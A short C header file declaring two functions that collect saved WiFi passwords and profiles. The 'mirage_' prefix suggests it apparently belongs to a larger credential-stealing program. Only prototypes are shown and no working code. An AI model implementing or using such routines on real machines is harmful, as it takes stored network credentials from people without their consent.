#ifndef WIFI_H
#define WIFI_H

#include <stddef.h>

// Collect WiFi passwords
int mirage_collect_wifi_passwords(char *output, size_t outlen);
int mirage_get_wifi_profiles(char *buf, size_t buflen);

#endif
